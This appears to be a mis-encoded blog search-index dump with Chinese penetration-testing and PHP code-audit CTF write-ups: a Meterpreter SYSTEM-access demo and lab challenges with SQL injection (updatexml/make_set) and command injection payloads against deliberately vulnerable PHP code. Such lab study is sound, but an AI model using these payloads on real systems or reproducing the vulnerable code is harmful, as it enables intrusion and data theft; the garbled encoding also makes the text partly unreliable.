ç›®çš„æ˜¯è¿›å…¥meterpreteræ¨¡å¼ï¼Œä½†æ˜¯ç»“æœå¹¶ä¸æ˜¯è¿™æ ·ã€‚æ£€æŸ¥é…ç½®åï¼Œå‘ç°åŸå› ï¼š Metasploitä¸­çš„æ‰«æå™¨å’Œå¤§éƒ¨åˆ†çš„å…¶ä»–è¾…åŠ©æ¨¡å—ä½¿ç”¨RHOSTSé€‰é¡¹è€Œä¸æ˜¯RHOST å°†é…ç½®éƒ¨åˆ†ä¸­rhostæ”¹ä¸ºrhosts,å¼€å§‹æ”»å‡»æˆåŠŸè¿›å…¥meterpreteræ¨¡å¼ï¼š +++ æŸ¥çœ‹æ­¤ç”¨æˆ·æƒé™ 1meterpreter &gt; getuid å¦‚å›¾ï¼Œå·²ç»è·å¾—NT AUTHORITY\\SYSTEMæƒé™ã€‚ +++ Meterpreter: Meterpreteræ˜¯Metasploitæ¡†æ¶ä¸­çš„ä¸€ä¸ªæ‰©å±•æ¨¡å—ï¼Œä½œä¸ºæº¢å‡ºæˆåŠŸä»¥åçš„æ”»å‡»è½½è·ä½¿ç”¨ï¼Œæ”»å‡»è½½è·åœ¨æº¢å‡ºæ”»å‡»æˆåŠŸä»¥åç»™æˆ‘ä»¬è¿”å›ä¸€ä¸ªæ§åˆ¶é€šé“ã€‚ä½¿ç”¨å®ƒä½œä¸ºæ”»å‡»è½½è·èƒ½å¤Ÿè·å¾—ç›®æ ‡ç³»ç»Ÿçš„ä¸€ä¸ªMeterpreter shellçš„é“¾æ¥ã€‚Meterpreter shellä½œä¸ºæ¸—é€æ¨¡å—æœ‰å¾ˆå¤šæœ‰ç”¨çš„åŠŸèƒ½ï¼Œæ¯”å¦‚æ·»åŠ ä¸€ä¸ªç”¨æˆ·ã€éšè—ä¸€äº›ä¸œè¥¿ã€æ‰“å¼€shellã€å¾—åˆ°ç”¨æˆ·å¯†ç ã€ä¸Šä¼ ä¸‹è½½è¿œç¨‹ä¸»æœºçš„æ–‡ä»¶ã€è¿è¡Œcmd.exeã€æ•æ‰å±å¹•ã€å¾—åˆ°è¿œç¨‹æ§åˆ¶æƒã€æ•è·æŒ‰é”®ä¿¡æ¯ã€æ¸…é™¤åº”ç”¨ç¨‹åºã€æ˜¾ç¤ºè¿œç¨‹ä¸»æœºçš„ç³»ç»Ÿä¿¡æ¯ã€æ˜¾ç¤ºè¿œç¨‹æœºå™¨çš„ç½‘ç»œæ¥å£å’ŒIPåœ°å€ç­‰ä¿¡æ¯ã€‚å¦å¤–Meterpreterèƒ½å¤Ÿèº²é¿å…¥ä¾µæ£€æµ‹ç³»ç»Ÿã€‚åœ¨è¿œç¨‹ä¸»æœºä¸Šéšè—è‡ªå·±,å®ƒä¸æ”¹å˜ç³»ç»Ÿç¡¬ç›˜ä¸­çš„æ–‡ä»¶,å› æ­¤HIDS[åŸºäºä¸»æœºçš„å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ]å¾ˆéš¾å¯¹å®ƒåšå‡ºå“åº”ã€‚æ­¤å¤–å®ƒåœ¨è¿è¡Œçš„æ—¶å€™ç³»ç»Ÿæ—¶é—´æ˜¯å˜åŒ–çš„,æ‰€ä»¥è·Ÿè¸ªå®ƒæˆ–è€…ç»ˆæ­¢å®ƒå¯¹äºä¸€ä¸ªæœ‰ç»éªŒçš„äººä¹Ÿä¼šå˜å¾—éå¸¸å›°éš¾ã€‚ +++","categories":[],"tags":[{"name":"Demo","slug":"Demo","permalink":"https://singlemindedt.github.io/tags/Demo/"},{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"https://singlemindedt.github.io/tags/æ¸—é€/"}]},{"title":"PHP-Audit-Labs","slug":"PHP-Audit-Labs","date":"2020-05-03T00:45:59.000Z","updated":"2020-05-10T09:03:01.301Z","comments":true,"path":"2020/05/03/PHP-Audit-Labs/","link":"","permalink":"https://singlemindedt.github.io/2020/05/03/PHP-Audit-Labs/","excerpt":"","text":"[çº¢æ—¥å®‰å…¨]ä»£ç å®¡è®¡Day1 - in_arrayå‡½æ•°ç¼ºé™·ä¸€ã€å…³äºin_array å®šä¹‰å’Œç”¨æ³• in_array() å‡½æ•°æœç´¢æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å€¼ã€‚ æ³¨é‡Šï¼šå¦‚æœ search å‚æ•°æ˜¯å­—ç¬¦ä¸²ä¸” type å‚æ•°è¢«è®¾ç½®ä¸º TRUEï¼Œåˆ™æœç´¢åŒºåˆ†å¤§å°å†™ã€‚ è¯­æ³• 1in_array(search,array,type) | å‚æ•° | æè¿° || :â€”â€”- | :â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“ || search | å¿…éœ€ã€‚è§„å®šè¦åœ¨æ•°ç»„æœç´¢çš„å€¼ã€‚ || array | å¿…éœ€ã€‚è§„å®šè¦æœç´¢çš„æ•°ç»„ã€‚ || type | å¯é€‰ã€‚å¦‚æœè®¾ç½®è¯¥å‚æ•°ä¸º trueï¼Œåˆ™æ£€æŸ¥æœç´¢çš„æ•°æ®ä¸æ•°ç»„çš„å€¼çš„ç±»å‹æ˜¯å¦ç›¸åŒã€‚ | æ¥æºï¼šwww.W3school.com.cn;[PHPæ‰‹å†Œ](https://www.php.net/parse_url) é¢˜ç›®[day1-2]:()è€ƒå¯Ÿç‚¹ï¼š in_arrayç»•è¿‡ ä½¿ç”¨æ‹¼æ¥å‡½æ•°updatexmlæ³¨å…¥ +++ 1.in_arrayç»•è¿‡å…³é”®ä»£ç ï¼š connect_error() (1)å®šä¹‰å’Œç”¨æ³• mysqli_connect_error() å‡½æ•°è¿”å›ä¸Šä¸€æ¬¡è¿æ¥é”™è¯¯çš„é”™è¯¯æè¿°ã€‚ (2)è¯­æ³• mysqli_connect_error(); (3)ç»†èŠ‚ è¿”å›å€¼ï¼š è¿”å›ä¸€ä¸ªæè¿°é”™è¯¯çš„å­—ç¬¦ä¸²ã€‚å¦‚æœæ²¡æœ‰é”™è¯¯å‘ç”Ÿåˆ™è¿”å› NULLã€‚ PHP ç‰ˆæœ¬ï¼š 5+ fetch_assoc() ï¼ˆ1ï¼‰å®šä¹‰å’Œç”¨æ³• mysqli_fetch_assoc() å‡½æ•°ä»ç»“æœé›†ä¸­å–å¾—ä¸€è¡Œä½œä¸ºå…³è”æ•°ç»„ã€‚ æ³¨é‡Šï¼šè¯¥å‡½æ•°è¿”å›çš„å­—æ®µåæ˜¯åŒºåˆ†å¤§å°å†™çš„ã€‚ ï¼ˆ2ï¼‰è¯­æ³•ï¼š mysqli_fetch_assoc(result); å‚æ•° æè¿° result å¿…éœ€ã€‚è§„å®šç”± mysqli_query()ã€mysqli_store_result() æˆ– mysqli_use_result() è¿”å›çš„ç»“æœé›†æ ‡è¯†ç¬¦ã€‚ ï¼ˆ3ï¼‰ç»†èŠ‚ï¼š è¿”å›å€¼ï¼š è¿”å›ä»£è¡¨è¯»å–è¡Œçš„å…³è”æ•°ç»„ã€‚å¦‚æœç»“æœé›†ä¸­æ²¡æœ‰æ›´å¤šçš„è¡Œåˆ™è¿”å› NULLã€‚ PHP ç‰ˆæœ¬ï¼š 5+ +++ query() (1)å®šä¹‰å’Œç”¨æ³• mysqli_query() å‡½æ•°æ‰§è¡ŒæŸä¸ªé’ˆå¯¹æ•°æ®åº“çš„æŸ¥è¯¢ã€‚ (2)è¯­æ³• mysqli_query(connection,query,resultmode); å‚æ•° æè¿° connection å¿…éœ€ã€‚è§„å®šè¦ä½¿ç”¨çš„ MySQL è¿æ¥ã€‚ query å¿…éœ€ï¼Œè§„å®šæŸ¥è¯¢å­—ç¬¦ä¸²ã€‚ resultmode å¯é€‰ã€‚ä¸€ä¸ªå¸¸é‡ã€‚å¯ä»¥æ˜¯ä¸‹åˆ—å€¼ä¸­çš„ä»»æ„ä¸€ä¸ªï¼šMYSQLI_USE_RESULTï¼ˆå¦‚æœéœ€è¦æ£€ç´¢å¤§é‡æ•°æ®ï¼Œè¯·ä½¿ç”¨è¿™ä¸ªï¼‰MYSQLI_STORE_RESULTï¼ˆé»˜è®¤ï¼‰ (3)ç»†èŠ‚ è¿”å›å€¼ï¼š é’ˆå¯¹æˆåŠŸçš„ SELECTã€SHOWã€DESCRIBE æˆ– EXPLAIN æŸ¥è¯¢ï¼Œå°†è¿”å›ä¸€ä¸ª mysqli_result å¯¹è±¡ã€‚é’ˆå¯¹å…¶ä»–æˆåŠŸçš„æŸ¥è¯¢ï¼Œå°†è¿”å› TRUEã€‚å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› FALSEã€‚ PHP ç‰ˆæœ¬ï¼š 5+ æ›´æ–°æ—¥å¿—ï¼š åœ¨ PHP 5.3.0 ä¸­æ–°å¢äº†å¼‚æ­¥æŸ¥è¯¢çš„åŠŸèƒ½ã€‚ +++ num_rows() (1)å®šä¹‰å’Œç”¨æ³• mysqli_num_rows() å‡½æ•°è¿”å›ç»“æœé›†ä¸­è¡Œçš„æ•°é‡ã€‚ (2)è¯­æ³• mysqli_num_rows(result); å‚æ•° æè¿° result å¿…éœ€ã€‚è§„å®šç”± mysqli_query()ã€mysqli_store_result() æˆ– mysqli_use_result() è¿”å›çš„ç»“æœé›†æ ‡è¯†ç¬¦ã€‚ (3)ç»†èŠ‚ è¿”å›å€¼ï¼š è¿”å›ç»“æœé›†ä¸­è¡Œçš„æ•°é‡ã€‚ PHP ç‰ˆæœ¬ï¼š 5+ +++ åˆ†æï¼šåœ¨index.phpæ–‡ä»¶ä¸­ï¼Œç¬¬11è¡Œçš„ifæ¡ä»¶è¯­å¥å¤„å¯ä»¥çœ‹å‡ºï¼Œç¨‹åºæŠŠç”¨æˆ·çš„IDå€¼å­˜å‚¨åœ¨ $whitelist æ•°ç»„ä¸­ï¼Œç„¶åå°†ç”¨æˆ·ä¼ å…¥çš„ id å‚æ•°å…ˆç»è¿‡config.phpæ–‡ä»¶ä¸­å®šä¹‰çš„stop_hackå‡½æ•°è¿‡æ»¤ï¼Œç„¶åå†ç”¨ in_array æ¥åˆ¤æ–­ç”¨æˆ·ä¼ å…¥çš„ id å‚æ•°æ˜¯å¦åœ¨ $whitelist æ•°ç»„ä¸­ï¼Œå¦‚æœä¸åœ¨ï¼Œè¿”å› id $id is not in whitelist. å¦‚æœåœ¨ï¼Œé‚£ä¹ˆæ‰§è¡ŒSQLè¯­å¥ï¼Œæœ€åè¿”å›æŸ¥è¯¢çš„å†…å®¹ã€‚è¿™é‡Œ in_array å‡½æ•°æ²¡æœ‰ä½¿ç”¨å¼ºåŒ¹é…ï¼Œæ‰€ä»¥æ˜¯å¯ä»¥ç»•è¿‡çš„ï¼Œä¾‹å¦‚ï¼š id=1â€™ æ˜¯å¯ä»¥æˆåŠŸç»•è¿‡ in_array å‡½æ•°çš„ã€‚config.phpæ–‡ä»¶ä¸­stop_hackå‡½æ•°ï¼Œè¿™æ˜¯ä¸€ä¸ªè¿‡æ»¤å‡½æ•°ï¼Œä¸»è¦è¿‡æ»¤äº†å­—ç¬¦ä¸²æ‹¼æ¥å‡½æ•°ï¼Œå¯¼è‡´æˆ‘ä»¬æ²¡æ³•ç›´æ¥é€šè¿‡union selctæˆ–è€…å¸¸è§çš„hex()ç­‰æ–¹å¼æ¥å¾—åˆ°flagã€‚ +++ 2. ä½¿ç”¨æ‹¼æ¥å‡½æ•°updatexmlæ³¨å…¥å…³äºUPDATEXML (XML_document, XPath_string, new_value); ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDocç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string(Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ï¼Œå¦‚æœä¸äº†è§£Xpathè¯­æ³•ï¼Œå¯ä»¥åœ¨ç½‘ä¸ŠæŸ¥æ‰¾æ•™ç¨‹ã€‚ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ® ä½œç”¨ï¼šæ”¹å˜æ–‡æ¡£ä¸­ç¬¦åˆæ¡ä»¶çš„èŠ‚ç‚¹çš„å€¼ æ³¨ï¼šUpdatexmlå‡½æ•°æœ‰ä¸ªç‰¹æ€§ï¼Œå½“ updatexml æŸ¥è¯¢çš„æ•°æ®ä¸­åŒ…å«ç‰¹æ®Šå­—ç¬¦æˆ–è€…å­—æ¯ï¼Œå°±ä¼šæŠ¥é”™ï¼ŒæŠ¥é”™ä¿¡æ¯ä¸ºç‰¹æ®Šå­—ç¬¦ã€å­—æ¯åŠä¹‹åçš„å†…å®¹ï¼Œå¦‚ï¼šæŸ¥è¯¢çš„æ•°æ®ä¸º99pandaï¼Œé‚£ä¹ˆç»“æœåªä¼šæ˜¾ç¤ºpandaã€‚ å› æ­¤è¿™é‡Œé€šè¿‡æŸ¥è¯¢database(),è¿”å›æ•°æ®åº“åï¼Œç„¶åCONCATå°†å…¶å­—ç¬¦ä¸²åŒ–ã€‚å› ä¸ºUpdateXmlç¬¬äºŒä¸ªå‚æ•°éœ€è¦Xpathæ ¼å¼çš„å­—ç¬¦ä¸²,æ‰€ä»¥ä¸ç¬¦åˆè¦æ±‚ï¼Œç„¶åæŠ¥é”™ã€‚ ç”±äºå­—ç¬¦ä¸²æ‹¼æ¥å‡½æ•°è¢«è¿‡æ»¤äº†ï¼Œå› æ­¤æ— æ³•ä½¿ç”¨concatç­‰å‡½æ•°æ„é€ è¯­å¥ï¼Œåªèƒ½é€‰æ‹©ä½¿ç”¨ä¸å¸¸ç”¨çš„å‡½æ•°â€”â€”make_set()å‡½æ•°ã€‚ å…³äºMAKE_SET(bits,str1,str2,â€¦) è¿”å›ä¸€ä¸ªè®¾å®šå€¼(å«å­å­—ç¬¦ä¸²åˆ†éš”å­—ç¬¦ä¸²â€,â€å­—ç¬¦)ï¼Œåœ¨è®¾ç½®ä½çš„ç›¸åº”ä½çš„å­—ç¬¦ä¸²ã€‚str1å¯¹åº”äºä½0ï¼Œstr2åˆ°ç¬¬1ä½ï¼Œä¾æ­¤ç±»æ¨ã€‚åœ¨str1ï¼Œstr1æœ‰NULLå€¼ï¼Œâ€¦é‚£ä¹ˆä¸æ·»åŠ åˆ°ç»“æœã€‚ å‚è€ƒï¼šå…³äºUPDATEXMLå’Œmake_set()å‡½æ•° å› æ­¤ï¼Œå¯æ„é€ æœ¬é¢˜çš„payloadï¼š 1http://localhost/index.php?id=4 and (select updatexml(1,make_set(3,'~',(select flag from flag)),1)) +++ [çº¢æ—¥å®‰å…¨]ä»£ç å®¡è®¡Day2 -filter_varå‡½æ•°äºŒã€å…³äºfilter_varå‡½æ•° å®šä¹‰å’Œç”¨æ³• filter_var() å‡½æ•°é€šè¿‡æŒ‡å®šçš„è¿‡æ»¤å™¨è¿‡æ»¤å˜é‡ã€‚ å¦‚æœæˆåŠŸï¼Œåˆ™è¿”å›å·²è¿‡æ»¤çš„æ•°æ®ï¼Œå¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› falseã€‚ è¯­æ³• 1filter_var(variable, filter, options) å‚æ•° æè¿° variable å¿…éœ€ã€‚è§„å®šè¦è¿‡æ»¤çš„å˜é‡ã€‚(å˜é‡çš„å€¼åœ¨è¿‡æ»¤å‰ï¼Œä¼šè¢«è½¬æ¢æˆå­—ç¬¦ä¸²) filter å¯é€‰ã€‚è§„å®šè¦ä½¿ç”¨çš„è¿‡æ»¤å™¨çš„ IDã€‚ options è§„å®šåŒ…å«æ ‡å¿—/é€‰é¡¹çš„æ•°ç»„ã€‚æ£€æŸ¥æ¯ä¸ªè¿‡æ»¤å™¨å¯èƒ½çš„æ ‡å¿—å’Œé€‰é¡¹ã€‚ é¢˜ç›®ï¼š12345678910111213141516171819202122// index.php&lt;?php $url = $_GET['url'];if(isset($url) &amp;&amp; filter_var($url, FILTER_VALIDATE_URL))&#123; $site_info = parse_url($url); if(preg_match('/sec-redclub.com$/',$site_info['host']))&#123; exec('curl \"'.$site_info['host'].'\"', $result); echo \"&lt;center&gt;&lt;h1&gt;You have curl &#123;$site_info['host']&#125; successfully!&lt;/h1&gt;&lt;/center&gt; &lt;center&gt;&lt;textarea rows='20' cols='90'&gt;\"; echo implode(' ', $result); &#125; else&#123; die(\"&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;\"); &#125;&#125;else&#123; echo \"&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt; &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;\";&#125;?&gt; +++ 1234// f1agi3hEre.php&lt;?php $flag = \"HRCTF&#123;f1lt3r_var_1s_s0_c00l&#125;\"?&gt; è€ƒå¯Ÿç‚¹ï¼š filter_var()ç»•è¿‡ è¿œç¨‹å‘½ä»¤æ‰§è¡Œ è¡¥å……ï¼š exec() (PHP 4, PHP 5, PHP 7) exec â€” æ‰§è¡Œä¸€ä¸ªå¤–éƒ¨ç¨‹åº; è¯´æ˜ï¼š 1exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] ) : string exec() æ‰§è¡Œ command å‚æ•°æ‰€æŒ‡å®šçš„å‘½ä»¤ã€‚ å‚æ•°ï¼š commandï¼šè¦æ‰§è¡Œçš„å‘½ä»¤ï¼› outputï¼šå¦‚æœæä¾›äº† output å‚æ•°ï¼Œ é‚£ä¹ˆä¼šç”¨å‘½ä»¤æ‰§è¡Œçš„è¾“å‡ºå¡«å……æ­¤æ•°ç»„ï¼Œ æ¯è¡Œè¾“å‡ºå¡«å……æ•°ç»„ä¸­çš„ä¸€ä¸ªå…ƒç´ ã€‚ æ•°ç»„ä¸­çš„æ•°æ®ä¸åŒ…å«è¡Œå°¾çš„ç©ºç™½å­—ç¬¦ï¼Œä¾‹å¦‚ \\n å­—ç¬¦ã€‚ è¯·æ³¨æ„ï¼Œå¦‚æœæ•°ç»„ä¸­å·²ç»åŒ…å«äº†éƒ¨åˆ†å…ƒç´ ï¼Œexec() å‡½æ•°ä¼šåœ¨æ•°ç»„æœ«å°¾è¿½åŠ å†…å®¹ã€‚å¦‚æœä½ ä¸æƒ³åœ¨æ•°ç»„æœ«å°¾è¿›è¡Œè¿½åŠ ï¼Œ è¯·åœ¨ä¼ å…¥ exec() å‡½æ•°ä¹‹å‰ å¯¹æ•°ç»„ä½¿ç”¨ unset() å‡½æ•°è¿›è¡Œé‡ç½®ã€‚ return_var:å¦‚æœåŒæ—¶æä¾› output å’Œ return_var å‚æ•°ï¼Œ å‘½ä»¤æ‰§è¡Œåçš„è¿”å›çŠ¶æ€ä¼šè¢«å†™å…¥åˆ°æ­¤å˜é‡ã€‚ è¿”å›å€¼ å‘½ä»¤æ‰§è¡Œç»“æœçš„æœ€åä¸€è¡Œå†…å®¹ã€‚ å¦‚æœä½ éœ€è¦è·å–æœªç»å¤„ç†çš„å…¨éƒ¨è¾“å‡ºæ•°æ®ï¼Œ è¯·ä½¿ç”¨ passthru() å‡½æ•°ã€‚ å¦‚æœæƒ³è¦è·å–å‘½ä»¤çš„è¾“å‡ºå†…å®¹ï¼Œ è¯·ç¡®ä¿ä½¿ç”¨ output å‚æ•°ã€‚ +++ parse_url() (PHP 4, PHP 5, PHP 7) parse_url â€” è§£æ URLï¼Œè¿”å›å…¶ç»„æˆéƒ¨åˆ†ã€‚ è¯´æ˜ 1parse_url ( string `$url` [, int `$component` = -1 ] ) : [mixed](https://www.php.net/manual/zh/language.pseudo-types.php#language.types.mixed) æœ¬å‡½æ•°è§£æä¸€ä¸ª URL å¹¶è¿”å›ä¸€ä¸ªå…³è”æ•°ç»„ï¼ŒåŒ…å«åœ¨ URL ä¸­å‡ºç°çš„å„ç§ç»„æˆéƒ¨åˆ†ã€‚ æœ¬å‡½æ•°ä¸æ˜¯ç”¨æ¥éªŒè¯ç»™å®š URL çš„åˆæ³•æ€§çš„ï¼Œåªæ˜¯å°†å…¶åˆ†è§£ä¸ºä¸‹é¢åˆ—å‡ºçš„éƒ¨åˆ†ã€‚ä¸å®Œæ•´çš„ URL ä¹Ÿè¢«æ¥å—ï¼Œparse_url() ä¼šå°è¯•å°½é‡æ­£ç¡®åœ°å°†å…¶è§£æã€‚ å‚æ•° url è¦è§£æçš„ URLã€‚æ— æ•ˆå­—ç¬¦å°†ä½¿ç”¨ _ æ¥æ›¿æ¢ã€‚ component æŒ‡å®š PHP_URL_SCHEMEã€ PHP_URL_HOSTã€ PHP_URL_PORTã€ PHP_URL_USERã€ PHP_URL_PASSã€ PHP_URL_PATHã€ PHP_URL_QUERY æˆ– PHP_URL_FRAGMENT çš„å…¶ä¸­ä¸€ä¸ªæ¥è·å– URL ä¸­æŒ‡å®šçš„éƒ¨åˆ†çš„ stringã€‚ ï¼ˆé™¤äº†æŒ‡å®šä¸º PHP_URL_PORT åï¼Œå°†è¿”å›ä¸€ä¸ª integer çš„å€¼ï¼‰ã€‚ è¿”å›å€¼ å¯¹ä¸¥é‡ä¸åˆæ ¼çš„ URLï¼Œparse_url() å¯èƒ½ä¼šè¿”å› FALSEã€‚ å¦‚æœçœç•¥äº† component å‚æ•°ï¼Œå°†è¿”å›ä¸€ä¸ªå…³è”æ•°ç»„ arrayï¼Œåœ¨ç›®å‰è‡³å°‘ä¼šæœ‰ä¸€ä¸ªå…ƒç´ åœ¨è¯¥æ•°ç»„ä¸­ã€‚æ•°ç»„ä¸­å¯èƒ½çš„é”®æœ‰ä»¥ä¸‹å‡ ç§ï¼š scheme - å¦‚ http host port user pass path query - åœ¨é—®å· ? ä¹‹å fragment - åœ¨æ•£åˆ—ç¬¦å· # ä¹‹å å¦‚æœæŒ‡å®šäº† component å‚æ•°ï¼Œ parse_url() è¿”å›ä¸€ä¸ª string ï¼ˆæˆ–åœ¨æŒ‡å®šä¸º PHP_URL_PORT æ—¶è¿”å›ä¸€ä¸ª integerï¼‰è€Œä¸æ˜¯ arrayã€‚å¦‚æœ URL ä¸­æŒ‡å®šçš„ç»„æˆéƒ¨åˆ†ä¸å­˜åœ¨ï¼Œå°†ä¼šè¿”å› NULLã€‚ å‚è€ƒï¼šPHPæ‰‹å†Œ +++ preg_match (PHP 4, PHP 5, PHP 7) preg_match â€” æ‰§è¡ŒåŒ¹é…æ­£åˆ™è¡¨è¾¾å¼ è¯´æ˜ 1preg_match ( string `$pattern` , string `$subject` [, array `&amp;$matches` [, int `$flags` = 0 [, int `$offset` = 0 ]]] ) : int æœç´¢subjectä¸patternç»™å®šçš„æ­£åˆ™è¡¨è¾¾å¼çš„ä¸€ä¸ªåŒ¹é…. +++ implode (PHP 4, PHP 5, PHP 7) implode â€” å°†ä¸€ä¸ªä¸€ç»´æ•°ç»„çš„å€¼è½¬åŒ–ä¸ºå­—ç¬¦ä¸² è¯´æ˜ implode ( string $glue , array $pieces ) : string implode ( array $pieces ) : string ç”¨ glue å°†ä¸€ç»´æ•°ç»„çš„å€¼è¿æ¥ä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ã€‚ Note:å› ä¸ºå†å²åŸå› ï¼Œimplode() å¯ä»¥æ¥æ”¶ä¸¤ç§å‚æ•°é¡ºåºï¼Œä½†æ˜¯ explode() ä¸è¡Œã€‚ä¸è¿‡æŒ‰æ–‡æ¡£ä¸­çš„é¡ºåºå¯ä»¥é¿å…æ··æ·†ã€‚ +++ åˆ†æï¼šé€šè¿‡GETæ–¹å¼å¾—åˆ°urlï¼Œå¹¶éšåç»è¿‡filter_varå’Œparse_urlå‡½æ•°è¿‡æ»¤å°†å€¼ä¼ ç»™å˜é‡$site_infoã€‚ç¨‹åºä½¿ç”¨ exec å‡½æ•°æ¥æ‰§è¡Œ curl å‘½ä»¤ï¼Œè§„å®šå½“ url å‚æ•°çš„å€¼ä»¥ sec-redclub.com ç»“å°¾æ—¶ï¼Œæ‰ä¼šæ‰§è¡Œ exec å‡½æ•°ã€‚ é¦–å…ˆæ„é€ payloadç»•è¿‡ç»•è¿‡ filter_var çš„ FILTER_VALIDATE_URL è¿‡æ»¤å™¨; 123http://localhost/index.php?url=demo://demo.com,sec-redclub.comORhttp://localhost/index.php?url=demo://demo.com:80;sec-redclub.com:80/ ç»•è¿‡ parse_url å‡½æ•°ï¼Œå¹¶ä¸”æ»¡è¶³ $site_info[â€˜hostâ€™] çš„å€¼ä»¥ sec-redclub.com ç»“å°¾ï¼Œpayloadå¦‚ä¸‹ï¼š 1http://localhost/index.php?url=demo://%22;ls;%23;sec-redclub.com:80/ å‚è€ƒç»•è¿‡æ–¹æ³• å½“æˆ‘ä»¬ç›´æ¥ç”¨ cat f1agi3hEre.php å‘½ä»¤çš„æ—¶å€™ï¼Œè¿‡ä¸äº† filter_var å‡½æ•°æ£€æµ‹ï¼Œå› ä¸ºåŒ…å«ç©ºæ ¼ï¼Œå…·ä½“payloadå¦‚ä¸‹ï¼š 1http://localhost/index.php?url=demo://%22;cat%20f1agi3hEre.php;%23;sec-redclub.com:80/ +++ [çº¢æ—¥å®‰å…¨]ä»£ç å®¡è®¡Day3 -å®ä¾‹åŒ–ä»»æ„å¯¹è±¡æ¼æ´é¢˜ç›®ï¼š12345678910111213141516171819202122// index.php&lt;?phpclass NotFound&#123; function __construct() &#123; die('404'); &#125;&#125;spl_autoload_register( function ($class)&#123; new NotFound(); &#125;);$classname = isset($_GET['name']) ? $_GET['name'] : null;$param = isset($_GET['param']) ? $_GET['param'] : null;$param2 = isset($_GET['param2']) ? $_GET['param2'] : null;if(class_exists($classname))&#123; $newclass = new $classname($param,$param2); var_dump($newclass); foreach ($newclass as $key=&gt;$value) echo $key.'=&gt;'.$value.'&lt;br&gt;';&#125; +++ 1234// f1agi3hEre.php&lt;?php$flag = \"HRCTF&#123;X33_W1tH_S1mpl3Xml3l3m3nt&#125;\";?&gt; +++ è¡¥å……ï¼š __construct() __construct() å‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„ SimpleXMLElement å¯¹è±¡ã€‚ å¦‚æœæˆåŠŸï¼Œåˆ™è¯¥å‡½æ•°è¿”å›ä¸€ä¸ªå¯¹è±¡ã€‚å¦‚æœå¤±è´¥ï¼Œåˆ™è¿”å› falseã€‚ +++ class_exists (PHP 4, PHP 5, PHP 7) class_exists â€” æ£€æŸ¥ç±»æ˜¯å¦å·²å®šä¹‰ è¯´æ˜ class_exists ( string $class_name [, bool $autoload = true ] ) : bool æ£€æŸ¥æŒ‡å®šçš„ç±»æ˜¯å¦å·²å®šä¹‰ã€‚ å‚æ•° class_name ç±»åã€‚åå­—çš„åŒ¹é…æ˜¯ä¸åˆ†åŒºå¤§å°å†™çš„ã€‚ autoload æ˜¯å¦é»˜è®¤è°ƒç”¨ __autoloadã€‚ è¿”å›å€¼ å¦‚æœç”± class_name æ‰€æŒ‡çš„ç±»å·²ç»å®šä¹‰ï¼Œæ­¤å‡½æ•°è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSEã€‚ +++ var_dump (PHP 4, PHP 5, PHP 7) var_dump â€” æ‰“å°å˜é‡çš„ç›¸å…³ä¿¡æ¯ è¯´æ˜ 1var_dump ( mixed $expression [, mixed $... ] ) : void æ­¤å‡½æ•°æ˜¾ç¤ºå…³äºä¸€ä¸ªæˆ–å¤šä¸ªè¡¨è¾¾å¼çš„ç»“æ„ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¡¨è¾¾å¼çš„ç±»å‹ä¸å€¼ã€‚æ•°ç»„å°†é€’å½’å±•å¼€å€¼ï¼Œé€šè¿‡ç¼©è¿›æ˜¾ç¤ºå…¶ç»“æ„ã€‚ In PHP 5 all public, private and protected properties of objects will be returned in the output. Tip å’Œç›´æ¥å°†ç»“æœè¾“å‡ºåˆ°æµè§ˆå™¨ä¸€æ ·ï¼Œå¯ä½¿ç”¨è¾“å‡ºæ§åˆ¶å‡½æ•°æ¥æ•è·å½“å‰å‡½æ•°çš„è¾“å‡ºï¼Œç„¶å(ä¾‹å¦‚)ä¿å­˜åˆ°ä¸€ä¸ª string ä¸­ã€‚ å‚æ•° expression ä½ è¦æ‰“å°çš„å˜é‡ã€‚ +++ foreach (PHP 4, PHP 5, PHP 7) foreach è¯­æ³•ç»“æ„æä¾›äº†éå†æ•°ç»„çš„ç®€å•æ–¹å¼ã€‚foreach ä»…èƒ½å¤Ÿåº”ç”¨äºæ•°ç»„å’Œå¯¹è±¡ï¼Œå¦‚æœå°è¯•åº”ç”¨äºå…¶ä»–æ•°æ®ç±»å‹çš„å˜é‡ï¼Œæˆ–è€…æœªåˆå§‹åŒ–çš„å˜é‡å°†å‘å‡ºé”™è¯¯ä¿¡æ¯ã€‚æœ‰ä¸¤ç§è¯­æ³•ï¼š 1234foreach (array_expression as $value) statementforeach (array_expression as $key =&gt; $value) statement ç¬¬ä¸€ç§æ ¼å¼éå†ç»™å®šçš„ array_expression æ•°ç»„ã€‚æ¯æ¬¡å¾ªç¯ä¸­ï¼Œå½“å‰å•å…ƒçš„å€¼è¢«èµ‹ç»™ $value å¹¶ä¸”æ•°ç»„å†…éƒ¨çš„æŒ‡é’ˆå‘å‰ç§»ä¸€æ­¥ï¼ˆå› æ­¤ä¸‹ä¸€æ¬¡å¾ªç¯ä¸­å°†ä¼šå¾—åˆ°ä¸‹ä¸€ä¸ªå•å…ƒï¼‰ã€‚ ç¬¬äºŒç§æ ¼å¼åšåŒæ 